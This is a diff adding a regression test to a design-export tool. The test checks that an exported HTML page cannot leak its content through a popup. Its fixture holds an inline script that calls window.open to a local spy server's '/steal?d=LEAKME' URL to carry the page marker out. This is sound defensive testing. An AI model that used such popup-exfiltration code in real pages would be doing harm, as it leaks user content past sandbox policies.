@@ -152,3 +152,46 @@ test('the export page policy runs scripts in an opaque origin and blocks every n
   }
 });
 
+
+test('a page that opens a popup cannot ship content out and still be reported complete', { timeout: 120000 }, async () => {
+  // `window.open` is not constrained by any CSP directive, and the popup is a NEW page, so it hits
+  // neither page.route nor the blocked list: an exporting document could put its own content in a URL
+  // while the export still reported complete:true. Both facts are covered here - the content must not
+  // leave, and the report must not claim a clean export.
+  const received = [];
+  const spy = http.createServer((request, response) => {
+    received.push(request.url);
+    response.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
+    response.end('ok');
+  });
+  await new Promise((done) => spy.listen(0, '127.0.0.1', done));
+  const spyOrigin = `http://127.0.0.1:${spy.address().port}`;
+  const directory = await mkdtemp(join(tmpdir(), 'eac-design-popup-'));
+  const engine = await createEngine({ dataDir: directory });
+  const app = await startServer({ engine, port: 0 });
+  try {
+    const project = await engine.handle('design_project_create', { title: 'popup probe', kind: 'document' });
+    const marker = 'LEAKME';
+    const artifact = await engine.handle('design_artifact_save', {
+      projectId: project.id, name: 'popup.html',
+      content: `<!doctype html><html><body>${marker}<script>
+        window.open('${spyOrigin}/steal?d=${marker}');
+      </script></body></html>`,
+    });
+    const report = await exportDesignArtifact({
+      store: engine.designStore,
+      id: artifact.id, format: 'png', origin: app.url,
+    });
+    await new Promise((resolve) => setTimeout(resolve, 800));
+    const leaked = received.filter((url) => url.includes(marker));
+    assert.deepEqual(leaked, [], `page content escaped to ${leaked.join(', ')}`);
+    assert.equal(report.complete, false, 'an export that opened a popup must not report complete');
+    assert.ok(report.blockedPopups.count >= 1, 'the popup must be recorded');
+    assert.ok(report.blockedPopups.sample.some((url) => url.includes('steal')), 'the attempted URL must be reported');
+  } finally {
+    await app.close();
+    await engine.close();
+    spy.close();
+    await rm(directory, { recursive: true, force: true });
+  }
+});
